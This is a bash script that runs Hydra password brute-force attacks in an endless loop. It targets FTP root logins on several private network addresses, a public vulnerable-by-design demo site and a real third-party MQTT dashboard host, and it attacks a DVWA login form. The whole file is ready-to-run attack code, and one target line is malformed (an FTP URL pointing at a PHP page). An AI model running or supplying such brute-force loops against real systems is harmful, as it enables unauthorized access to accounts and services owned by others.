#!/bin/bash

while :
do
	hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 5 ftp://192.168.1.152 &
	hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 5 ftp://192.168.1.184  &
	hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 5 ftp://192.168.1.190 &
	hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 5 ftp://192.168.1.193 &
	hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 5 ftp://192.168.1.194  &
	hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 5 ftp://192.168.1.195  &
	hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 5 ftp://testphp.vulnweb.com/listproducts.php 
	hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 5 ftp://www.mqtt-dashboard.com 
	hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.195 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V -t 2
done


